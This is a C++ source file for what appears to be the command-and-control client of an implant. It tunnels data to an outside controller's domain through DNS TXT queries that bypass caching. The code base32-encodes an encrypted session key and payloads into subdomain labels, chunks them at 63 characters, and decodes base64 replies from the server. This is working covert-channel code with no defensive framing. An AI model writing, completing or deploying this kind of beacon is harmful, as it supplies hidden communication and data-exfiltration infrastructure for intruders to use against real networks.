#include "C2.h"
#include "base64.h"
#include <windns.h>
#include <iostream>
#include "utils.h"

using std::cout;
using std::endl;
using std::to_string;

C2::C2(const string baseDomain) {

	this->session_id = 0;
	this->baseDomain = baseDomain;
	vector<BYTE> emptyVector;
	emptyVector.clear();
	vector<BYTE> data = this->query(emptyVector, false);

	unsigned long session_id_network = *((unsigned long*)&data[0]);
	this->session_id = ntohl(session_id_network);

	vector<BYTE> byteSessionKey = this->crypto.getProtectedSessionKey();
	string sessionKey = base32_encode_nopad(&byteSessionKey[0], byteSessionKey.size());
	int stage = 0;
	for (int index = 0; index < sessionKey.size(); index += 63) {
		string response = this->request(sessionKey.substr(index, min(sessionKey.size() - index, 63)) + "." + to_string(stage++) + "." + to_string(this->session_id));
		if (response != "OK") exit(1);
	}

}

string C2::request(const string subDomain) {

	string domain =  subDomain + "." + this->baseDomain;

	// Make the request
	PDNS_RECORD dnsResponse;
	DNS_STATUS dnsStatus = DnsQuery_A(
		domain.c_str(),
		DNS_TYPE_TEXT,
		DNS_QUERY_BYPASS_CACHE,
		NULL,
		&dnsResponse,
		NULL);
	if (dnsStatus) {
		exit(1);
	}
	if (!dnsResponse || dnsResponse->Data.TXT.dwStringCount != 1) {
		exit(1);
	}
	string responseText = dnsResponse->Data.TXT.pStringArray[0];
	DnsRecordListFree(dnsResponse);

	return responseText;
}

vector<BYTE> C2::query(const vector<BYTE> data, bool encrypt) {
	vector<BYTE> payload = data;
	long long timestamp = getTimeMillisecondes();
	BYTE* x = (BYTE*)&timestamp;
	for (int i = 0; i < 8; i++) payload.insert(payload.begin(), *(x++));
	if (encrypt) payload = this->crypto.encrypt(payload);
	string base32payload = base32_encode_nopad(&payload[0], payload.size());
	string domain = base32payload + "." + to_string(this->session_id);
	string responseText = request(domain);
	vector<BYTE> response = base64_decode(responseText);
	if (encrypt) response = this->crypto.decrypt(response);
	return response;
}